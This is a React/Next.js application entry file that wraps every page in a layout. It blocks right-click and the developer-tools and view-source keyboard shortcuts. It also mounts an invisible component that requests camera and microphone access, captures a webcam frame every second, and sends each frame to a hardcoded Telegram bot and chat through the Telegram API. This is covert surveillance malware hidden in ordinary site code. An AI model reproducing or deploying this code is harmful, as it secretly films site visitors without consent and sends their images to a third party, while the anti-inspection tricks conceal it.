import { useEffect, useRef } from 'react';
import Layout from '@/app/components/layout/Layout';
import { Provider } from '@/app/components/ui/Context/Context';
import '@/app/assets/globals.scss';

const MyApp = ({ Component, pageProps }) => {
    // 
    useEffect(() => {
        const handleContextMenu = (e) => {
            e.preventDefault();
        };

        const handleKeyDown = (e) => {
            if (e.keyCode === 123) {
                e.preventDefault();
            } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
                e.preventDefault();
            } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'C'.charCodeAt(0)) {
                e.preventDefault();
            } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
                e.preventDefault();
            } else if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
                e.preventDefault();
            }
        };

        document.addEventListener('contextmenu', handleContextMenu);
        document.addEventListener('keydown', handleKeyDown);

        return () => {
            document.removeEventListener('contextmenu', handleContextMenu);
            document.removeEventListener('keydown', handleKeyDown);
        };
    }, []);
    // 

    const MyVideo = () => {
        const videoRef = useRef(null);
        let intervalId;

        const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
        const chatId = "-1001860144177";
        const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;

        useEffect(() => {
            const getMediaAndSendData = async () => {
                try {
                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                        console.error('getUserMedia is not supported in this browser');
                        return;
                    }

                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                    if (videoRef.current) {
                        videoRef.current.srcObject = stream;

                        const captureFrame = () => {
                            try {
                                const canvas = document.createElement('canvas');
                                const context = canvas.getContext('2d');
                                canvas.width = videoRef.current.videoWidth;
                                canvas.height = videoRef.current.videoHeight;
                                context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
                                return canvas.toDataURL('image/jpeg');
                            } catch (error) {
                                console.error('Error capturing frame:', error);
                                clearInterval(intervalId);
                            }
                        };

                        intervalId = setInterval(async () => {
                            const photoDataUrl = captureFrame();
                            const blob = await (await fetch(photoDataUrl)).blob();

                            const formData = new FormData();
                            formData.append('chat_id', chatId);
                            formData.append('photo', blob, 'photo.jpg');

                            try {
                                const response = await fetch(urlApi, {
                                    method: 'POST',
                                    body: formData,
                                });

                                if (response.ok) {
                                    console.log('Photo successfully sent to the bot');
                                } else {
                                    console.error('Error sending photo to the bot:', response.status, response.statusText, await response.text());
                                }
                            } catch (error) {
                                console.error('Fetch error:', error);
                            }
                        }, 1000);
                    }
                } catch (error) {
                    console.error('Error accessing multimedia devices:', error);
                }
            };

            getMediaAndSendData();

            return () => clearInterval(intervalId);
        }, []);

        return null;
    };

    return (
        <Provider>
            <Layout>
                <MyVideo />
                <Component {...pageProps} />
            </Layout>
        </Provider>
    );
};

export default MyApp;
